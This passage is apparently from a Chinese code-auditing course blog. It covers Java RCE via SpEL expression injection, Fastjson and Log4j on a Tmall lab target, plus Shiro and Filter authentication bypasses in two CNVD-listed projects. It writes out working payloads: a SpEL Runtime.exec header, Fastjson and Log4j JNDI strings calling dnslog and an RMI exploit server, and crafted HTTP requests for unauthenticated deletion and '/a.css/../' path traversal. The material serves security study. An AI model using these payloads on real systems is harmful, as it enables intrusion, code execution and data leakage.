title="演示案例："></a>演示案例：</h3><h4 id="JAVA的RCE更多的是框架和模板上的RCE-这里的案例都是框架上造成的RCE：Fastjson、Log4j"><a href="#JAVA的RCE更多的是框架和模板上的RCE-这里的案例都是框架上造成的RCE：Fastjson、Log4j" class="headerlink" title="JAVA的RCE更多的是框架和模板上的RCE,这里的案例都是框架上造成的RCE：Fastjson、Log4j"></a>JAVA的RCE更多的是框架和模板上的RCE,这里的案例都是框架上造成的RCE：Fastjson、Log4j</h4><h4 id="➢-DEMO-代码函数-参数传递-amp-函数执行"><a href="#➢-DEMO-代码函数-参数传递-amp-函数执行" class="headerlink" title="➢ DEMO-代码函数-参数传递&amp;函数执行"></a>➢ DEMO-代码函数-参数传递&amp;函数执行</h4><h4 id="➢-框架-表达式注入-SPEL-amp-JSTL-amp-OGNL等"><a href="#➢-框架-表达式注入-SPEL-amp-JSTL-amp-OGNL等" class="headerlink" title="➢ 框架-表达式注入-SPEL&amp;JSTL&amp;OGNL等"></a>➢ 框架-表达式注入-SPEL&amp;JSTL&amp;OGNL等</h4><h4 id="➢-实例-第三方框架-Tmall-amp-FastJson-amp-Log4j"><a href="#➢-实例-第三方框架-Tmall-amp-FastJson-amp-Log4j" class="headerlink" title="➢ 实例-第三方框架-Tmall&amp;FastJson&amp;Log4j"></a>➢ 实例-第三方框架-Tmall&amp;FastJson&amp;Log4j</h4></blockquote><p><strong>1、服务端直接存在可执行函数（exec()等），且对传入的参数过滤不严格导致RCE漏洞</strong></p><p><strong>2、服务端不直接存在可执行函数（exec()等），且对传入的参数过滤不严格导致RCE漏洞</strong></p><p><strong>3、由表达式注入导致的RCE漏洞，如：OGNL、SpEL、MVEL、EL、Fel、JST+EL等</strong></p><p><strong>4、由java后端模板引擎注入导致的RCE漏洞，如：Freemarker、Velocity、Thymeleaf等</strong></p><p><strong>5、由java一些脚本语言引起的RCE漏洞，如：Groovy、JavascriptEngine等</strong></p><p><strong>6、由第三方开源组件引起的RCE漏洞，如：Fastjson、Shiro、Xstream、Struts2等</strong></p><h4 id="DEMO-代码函数-参数传递-amp-函数执行"><a href="#DEMO-代码函数-参数传递-amp-函数执行" class="headerlink" title="#DEMO-代码函数-参数传递&amp;函数执行"></a>#DEMO-代码函数-参数传递&amp;函数执行</h4><p>windows-cmd.jsp?cmd&#x3D;ipconfig</p><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412172410798.png" alt="image-20230412172410798"></p><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412172439910.png" alt="image-20230412172439910"></p><h4 id="框架-表达式注入-SPEL-amp-JSTL-amp-OGNL等"><a href="#框架-表达式注入-SPEL-amp-JSTL-amp-OGNL等" class="headerlink" title="#框架-表达式注入-SPEL&amp;JSTL&amp;OGNL等"></a>#框架-表达式注入-SPEL&amp;JSTL&amp;OGNL等</h4><p><a href="https://www.freebuf.com/articles/web/325700.html">Java安全学习—表达式注入 - FreeBuf网络安全行业门户</a></p><p>Struts2——OGNL</p><p>Spring——SPEL</p><p>JSP——JSTL_EL</p><p>Elasticsearch——MVEL</p><p>&#x2F;jstl.jsp?url&#x3D;<a href="http://www.xiaodi8.com/">http://www.xiaodi8.com</a></p><p>&#x2F;expression&#x2F;jstl.jsp?url&#x3D;file:&#x2F;&#x2F;&#x2F;d:&#x2F;e.txt</p><p>spring-cloud-function SpEL</p><p>java -jar demo-0.0.1-SNAPSHOT.jar</p><p><code>POST /functionRouter HTTP/1.1</code></p><p><code>Host: 127.0.0.1:8080</code></p><p><code>spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</code></p><p><code>Content-Type: application/x-www-form-urlencoded</code></p><p><code>Content-Length: 5</code></p><p><code>xxx</code></p><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412173301000.png" alt="image-20230412173301000"></p><h4 id="实例-第三方框架-Tmall-amp-FastJson-amp-Log4j"><a href="#实例-第三方框架-Tmall-amp-FastJson-amp-Log4j" class="headerlink" title="#实例-第三方框架-Tmall&amp;FastJson&amp;Log4j"></a>#实例-第三方框架-Tmall&amp;FastJson&amp;Log4j</h4><p><a href="https://blog.csdn.net/jinzezhi/article/details/124274123">(23条消息) Fastjson反序列化漏洞复现(实战案例)_@A1的博客-CSDN博客</a></p><h5 id="靶场：Tmall"><a href="#靶场：Tmall" class="headerlink" title="靶场：Tmall"></a>靶场：Tmall</h5><h5 id="在pom-xml里面找到常用的框架"><a href="#在pom-xml里面找到常用的框架" class="headerlink" title="在pom.xml里面找到常用的框架"></a>在pom.xml里面找到常用的框架</h5><h5 id="1、Fastjson-代码执行"><a href="#1、Fastjson-代码执行" class="headerlink" title="1、Fastjson 代码执行"></a>1、Fastjson 代码执行</h5><h5 id="payload-“-type”-”java-net-Inet4Address”-”val”-”sppj9z-dnslog-cn”"><a href="#payload-“-type”-”java-net-Inet4Address”-”val”-”sppj9z-dnslog-cn”" class="headerlink" title="payload:{“@type”:”java.net.Inet4Address”,”val”:”sppj9z.dnslog.cn”}"></a>payload:{“@type”:”java.net.Inet4Address”,”val”:”sppj9z.dnslog.cn”}</h5><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412174555694.png" alt="image-20230412174555694"></p><h6 id="找fastjson关键字parseObject"><a href="#找fastjson关键字parseObject" class="headerlink" title="找fastjson关键字parseObject"></a>找fastjson关键字parseObject<img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412175603942.png" alt="image-20230412175603942"></h6><h6 id="找到上述蓝色处，发现定义了个属性是JSON"><a href="#找到上述蓝色处，发现定义了个属性是JSON" class="headerlink" title="找到上述蓝色处，发现定义了个属性是JSON"></a>找到上述蓝色处，发现定义了个属性是JSON</h6><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412175658719.png" alt="image-20230412175658719"></p><h6 id="翻上去查看路径，根据路径登录后台查看功能处"><a href="#翻上去查看路径，根据路径登录后台查看功能处" class="headerlink" title="翻上去查看路径，根据路径登录后台查看功能处"></a>翻上去查看路径，根据路径登录后台查看功能处</h6><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412180331703.png" alt="image-20230412180331703"></p><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412180507699.png" alt="image-20230412180507699"></p><h6 id="在这里进行抓包，修改刚才接收json数据的属性propertyJson-尝试命令执行带外出网"><a href="#在这里进行抓包，修改刚才接收json数据的属性propertyJson-尝试命令执行带外出网" class="headerlink" title="在这里进行抓包，修改刚才接收json数据的属性propertyJson,尝试命令执行带外出网"></a>在这里进行抓包，修改刚才接收json数据的属性propertyJson,尝试命令执行带外出网</h6><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412180732089.png" alt="image-20230412180732089"></p><h6 id="dnslog接收到了，还可以进行反弹shell"><a href="#dnslog接收到了，还可以进行反弹shell" class="headerlink" title="dnslog接收到了，还可以进行反弹shell"></a>dnslog接收到了，还可以进行反弹shell</h6><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412180836477.png" alt="image-20230412180836477"></p><h5 id="2、Log4j-代码执行"><a href="#2、Log4j-代码执行" class="headerlink" title="2、Log4j 代码执行"></a>2、Log4j 代码执行</h5><h5 id="靶场：Tmall-1"><a href="#靶场：Tmall-1" class="headerlink" title="靶场：Tmall"></a>靶场：Tmall</h5><p><a href="https://blog.csdn.net/Koikoi12/article/details/121906895">(23条消息) log4j漏洞成因和原理（JNDI和LDAP）_jndi ldap_Koikoi123的博客-CSDN博客</a></p><p><a href="https://www.cnblogs.com/bflw/p/15687995.html">Apache Log4j2-任意代码执行-漏洞复现（弹shell） - 小菜鸟当黑客 - 博客园 (cnblogs.com)</a></p><h6 id="三种payload"><a href="#三种payload" class="headerlink" title="三种payload:"></a>三种payload:</h6><p>filename&#x3D;”${jndi:ldap:&#x2F;&#x2F;sppj9z.dnslog.cn}”  （dnslog带外出网测试）<strong>采用ldap协议带外</strong></p><p>filename&#x3D;”${jndi:ldap:&#x2F;&#x2F;${env:OS}.sppj9z.dnslog.cn}”   （获取操作系统版本）<strong>采用ldap协议带外</strong></p><p>弹出计算机步骤：（<strong>rmi是dns协议带外出网</strong>）</p><p>1、java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “calc” （本地开启服务）</p><p>2、filename&#x3D;”${jndi:rmi:&#x2F;&#x2F;192.168.1.8:1099&#x2F;yfwrr7}”  （复制链接弹出计算器）</p><h6 id="漏洞涉及版本"><a href="#漏洞涉及版本" class="headerlink" title="漏洞涉及版本"></a>漏洞涉及版本</h6><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412181046268.png" alt="image-20230412181046268"></p><h6 id="搜索关键字"><a href="#搜索关键字" class="headerlink" title="搜索关键字"></a>搜索关键字</h6><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412181240811.png" alt="image-20230412181240811"></p><h6 id="找到下列文件处，因为要找有变量可控的，固定的不行"><a href="#找到下列文件处，因为要找有变量可控的，固定的不行" class="headerlink" title="找到下列文件处，因为要找有变量可控的，固定的不行"></a>找到下列文件处，因为要找有变量可控的，固定的不行</h6><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412181356279.png" alt="image-20230412181356279"></p><h6 id="上述代码是管理员头像上传的地方，找到对应处，猜测上面标明的文件名应该是文件上传名"><a href="#上述代码是管理员头像上传的地方，找到对应处，猜测上面标明的文件名应该是文件上传名" class="headerlink" title="上述代码是管理员头像上传的地方，找到对应处，猜测上面标明的文件名应该是文件上传名"></a>上述代码是管理员头像上传的地方，找到对应处，猜测上面标明的文件名应该是文件上传名</h6><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412182342580.png" alt="image-20230412182342580"></p><h6 id="上传头像抓包，带外测试（可以用符号’-’试试即可以上传头像也可以执行命令）"><a href="#上传头像抓包，带外测试（可以用符号’-’试试即可以上传头像也可以执行命令）" class="headerlink" title="上传头像抓包，带外测试（可以用符号’|’试试即可以上传头像也可以执行命令）"></a>上传头像抓包，带外测试（可以用符号’|’试试即可以上传头像也可以执行命令）</h6><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412183915290.png" alt="image-20230412183915290"></p><h6 id="发现能出网，说明有命令执行漏洞"><a href="#发现能出网，说明有命令执行漏洞" class="headerlink" title="发现能出网，说明有命令执行漏洞"></a>发现能出网，说明有命令执行漏洞</h6><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412182206173.png" alt="image-20230412182206173"></p><h6 id="尝试获取操作系统版本"><a href="#尝试获取操作系统版本" class="headerlink" title="尝试获取操作系统版本"></a>尝试获取操作系统版本</h6><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412182617806.png" alt="image-20230412182617806"></p><h6 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h6><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412182535354.png" alt="image-20230412182535354"></p><h6 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h6><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412183553724.png" alt="image-20230412183553724"></p><h6 id="复制一个链接构造payload-filename-x3D-”-jndi-rmi-x2F-x2F-192-168-1-8-1099-x2F-yfwrr7-”，实现弹出计算机"><a href="#复制一个链接构造payload-filename-x3D-”-jndi-rmi-x2F-x2F-192-168-1-8-1099-x2F-yfwrr7-”，实现弹出计算机" class="headerlink" title="复制一个链接构造payload:filename&#x3D;”${jndi:rmi:&#x2F;&#x2F;192.168.1.8:1099&#x2F;yfwrr7}”，实现弹出计算机"></a>复制一个链接构造payload:filename&#x3D;”${jndi:rmi:&#x2F;&#x2F;192.168.1.8:1099&#x2F;yfwrr7}”，实现弹出计算机</h6><p><img src="/../images/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/image-20230412183659149.png" alt="image-20230412183659149"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day91 代码审计-Java项目&amp;访问控制&amp;Shiro框架&amp;Filter过滤器&amp;CNVD分析</title>
      <link href="/2023/04/11/Day91-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-Shiro%E6%A1%86%E6%9E%B6-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90/"/>
      <url>/2023/04/11/Day91-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-Shiro%E6%A1%86%E6%9E%B6-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Java-配置-Filter过滤器</p><p>2、Java-配置-第三方框架组件</p><p>3、Java-代审-访问控制&amp;逻辑越权</p><h3 id="Java审计知识点："><a href="#Java审计知识点：" class="headerlink" title="#Java审计知识点："></a>#Java审计知识点：</h3><p>SQL注入，XSS跨站，RCE执行，反序列化，身份验证，SPEL，SSTI，三方组件安全等</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><h4 id="Javaweb身份验证访问控制："><a href="#Javaweb身份验证访问控制：" class="headerlink" title="Javaweb身份验证访问控制："></a>Javaweb身份验证访问控制：</h4><p>开发做访问控制身份验证有几种技术方案实现：</p><p>1、传统代码-登录性判断文件代码看</p><p>2、Shiro框架引用-看配置看引用看外部库</p><p>3、Filter过滤器-看配置看过滤器目录分析代码</p><p>4、JWT技术-看看引用看外部库搜关键函数代码</p><p><strong>审计此类漏洞：</strong></p><p><strong>搞清楚代码的验证方式</strong></p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-逻辑越权-WS租车系统-传统验证机制"><a href="#➢-逻辑越权-WS租车系统-传统验证机制" class="headerlink" title="➢ 逻辑越权-WS租车系统-传统验证机制"></a>➢ 逻辑越权-WS租车系统-传统验证机制</h4><h4 id="➢-CNVD-Tumo-未授权访问-Shiro框架引用"><a href="#➢-CNVD-Tumo-未授权访问-Shiro框架引用" class="headerlink" title="➢ CNVD-Tumo-未授权访问-Shiro框架引用"></a>➢ CNVD-Tumo-未授权访问-Shiro框架引用</h4><h4 id="➢-CNVD-华夏ERP-未授权访问-Filter过滤器"><a href="#➢-CNVD-华夏ERP-未授权访问-Filter过滤器" class="headerlink" title="➢ CNVD-华夏ERP-未授权访问-Filter过滤器"></a>➢ CNVD-华夏ERP-未授权访问-Filter过滤器</h4></blockquote><h4 id="逻辑越权-WS租车系统-传统验证机制"><a href="#逻辑越权-WS租车系统-传统验证机制" class="headerlink" title="#逻辑越权-WS租车系统-传统验证机制"></a>#逻辑越权-WS租车系统-传统验证机制</h4><p>-传统验证</p><p>1、垂直用户进行权限测试</p><p>2、抓包配合反编译查看代码</p><p>weishang-1.4.jar</p><p>car-weishang-1.0.jar</p><h4 id="CNVD-Tumo-未授权访问-Shiro框架引用"><a href="#CNVD-Tumo-未授权访问-Shiro框架引用" class="headerlink" title="#CNVD-Tumo-未授权访问-Shiro框架引用"></a>#CNVD-Tumo-未授权访问-Shiro框架引用</h4><p>-shiro开源框架引用</p><p>项目地址：</p><p><a href="https://github.com/TyCoding/tumo">https://github.com/TyCoding/tumo</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/2455201">https://www.cnvd.org.cn/flaw/show/2455201</a></p><p>shiro是apache的一个开源框架,是一个权限管理的框架,实现 用户认证、用户授权。</p><h5 id="1、引用shiro做身份验证"><a href="#1、引用shiro做身份验证" class="headerlink" title="1、引用shiro做身份验证"></a>1、引用shiro做身份验证</h5><p><img src="/../images/Day91-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-Shiro%E6%A1%86%E6%9E%B6-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90/image-20230412153439280.png" alt="image-20230412153439280"></p><p>pom.xml Maven配置文件</p><p><code>&lt;shiro-spring-version&gt;1.5.2&lt;/shiro-spring-version&gt;</code></p><p><code>&lt;shiro-ehcache.version&gt;1.5.3&lt;/shiro-ehcache.version&gt;</code></p><h5 id="2、查看shiro配置信息"><a href="#2、查看shiro配置信息" class="headerlink" title="2、查看shiro配置信息"></a>2、查看shiro配置信息</h5><p>anon一般代表不需要鉴权的配置，**则表示该接口下的所有接口。</p><p>tumo.shiro.anon_url&#x3D;\</p><p>  &#x2F;login,&#x2F;logout,&#x2F;register,\</p><p>  &#x2F;,&#x2F;about,&#x2F;p&#x2F;<strong>,&#x2F;links,&#x2F;comment&#x2F;</strong>,&#x2F;link&#x2F;list,&#x2F;article&#x2F;list,\</p><p>  &#x2F;css&#x2F;<strong>,&#x2F;js&#x2F;</strong>,&#x2F;img&#x2F;**</p><h5 id="3、寻找利用点"><a href="#3、寻找利用点" class="headerlink" title="3、寻找利用点"></a>3、寻找利用点</h5><p>CommentController.java</p><p>@RequestMapping(“&#x2F;comment”)</p><p>@DeleteMapping(“&#x2F;{id}”)</p><h5 id="4、测试"><a href="#4、测试" class="headerlink" title="4、测试"></a>4、测试</h5><p><strong>未授权删除</strong></p><p><code>DELETE /comment/6 HTTP/1.1</code></p><p><code>Host: xx.xx.xx.xx</code></p><p><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</code></p><p><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</code></p><p><code>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</code></p><p><code>Accept-Encoding: gzip, deflate</code></p><p><code>DNT: 1</code></p><p><code>Cookie: JSESSIONID=65363705-4943-4f66-8d3e-06e847ae8d58</code></p><p><code>Connection: close</code></p><p><code>Upgrade-Insecure-Requests: 1</code></p><p><img src="/../images/Day91-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-Shiro%E6%A1%86%E6%9E%B6-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90/image-20230412163312857.png" alt="image-20230412163312857"></p><h4 id="CNVD-华夏ERP-未授权访问-Filter过滤器"><a href="#CNVD-华夏ERP-未授权访问-Filter过滤器" class="headerlink" title="#CNVD-华夏ERP-未授权访问-Filter过滤器"></a>#CNVD-华夏ERP-未授权访问-Filter过滤器</h4><p><a href="https://gitee.com/jishenghua/JSH_ERP">https://gitee.com/jishenghua/JSH_ERP</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/2457718">https://www.cnvd.org.cn/flaw/show/2457718</a></p><p>-Filter过滤器</p><h5 id="1、com-jsh-erp-filter-LogCostFilter"><a href="#1、com-jsh-erp-filter-LogCostFilter" class="headerlink" title="1、com.jsh.erp.filter.LogCostFilter"></a>1、com.jsh.erp.filter.LogCostFilter</h5><p><img src="/../images/Day91-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-Shiro%E6%A1%86%E6%9E%B6-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90/image-20230412164151469.png" alt="image-20230412164151469"></p><p>使用了4个if判断，</p><p>第1个if：如果有seesion则不跳登录页</p><p>第2个if：如果包含login或register页面则不跳登录页</p><p>第3个if：调用verify传入ignoredList与用户请求URL</p><p>第4个if：如果存在allowUrls则不跳登录</p><p>查找ignoredList来源</p><p><img src="/../images/Day91-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-Shiro%E6%A1%86%E6%9E%B6-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90/image-20230412164228283.png" alt="image-20230412164228283"></p><h5 id="2、allowUrls存在ignoredList"><a href="#2、allowUrls存在ignoredList" class="headerlink" title="2、allowUrls存在ignoredList"></a>2、allowUrls存在ignoredList</h5><h6 id="如果访问css、js这种文件就不需要登录"><a href="#如果访问css、js这种文件就不需要登录" class="headerlink" title="如果访问css、js这种文件就不需要登录"></a>如果访问css、js这种文件就不需要登录</h6><p><img src="/../images/Day91-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-Shiro%E6%A1%86%E6%9E%B6-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90/image-20230412165619183.png" alt="image-20230412165619183"></p><p><a href="http://test.com/hello">http://test.com/a.css/../hello</a></p><h6 id="直接访问会重定向到登录页面"><a href="#直接访问会重定向到登录页面" class="headerlink" title="直接访问会重定向到登录页面"></a>直接访问会重定向到登录页面</h6><p><img src="/../images/Day91-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-Shiro%E6%A1%86%E6%9E%B6-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90/image-20230412164955690.png" alt="image-20230412164955690"></p><h5 id="3、测试"><a href="#3、测试" class="headerlink" title="3、测试"></a>3、测试</h5><p><code>GET /a.css/../pages/materials/retail_back_list.html HTTP/1.1</code></p><p><code>Host: xx.xx.xx.xx</code></p><p><code>Upgrade-Insecure-Requests: 1</code></p><p><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36</code></p><p><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</code></p><p><code>Referer: http://xx.xx.xx.xx/index.html</code></p><p><code>Accept-Encoding: gzip, deflate</code></p><p><code>Accept-Language: zh-CN,zh;q=0.9</code></p><p><code>Connection: close</code></p><p>成功跳转</p><p><img src="/../images/Day91-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-Shiro%E6%A1%86%E6%9E%B6-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90/image-20230412165210652.png" alt="image-20230412165210652"></p><h4 id="JWT引用验证"><a href="#JWT引用验证" class="headerlink" title="-JWT引用验证"></a>-JWT引用验证</h4><p>看看引用看外部库搜关键函数代码</p><p><a href="https://www.cnblogs.com/vege/p/14468030.html">https://www.cnblogs.com/vege/p/14468030.html</a></p><p>见第21天：WEB攻防-JavaWeb项目&amp;JWT身份攻击&amp;组件安全&amp;访问控制</p><p>键值逻辑：使用键名键值进行对比验证错误</p><p>JWT攻击：1、签名没验证空加密 2、爆破密匙 3、KID利用</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day90 代码审计-Java项目&amp;Filter过滤器&amp;CNVD分析&amp;XSS跨站&amp;框架安全</title>
      <link href="/2023/04/11/Day90-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90-XSS%E8%B7%A8%E7%AB%99-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/"/>
      <url>/2023/04/11/Day90-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90-XSS%E8%B7%A8%E7%AB%99-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/</url>
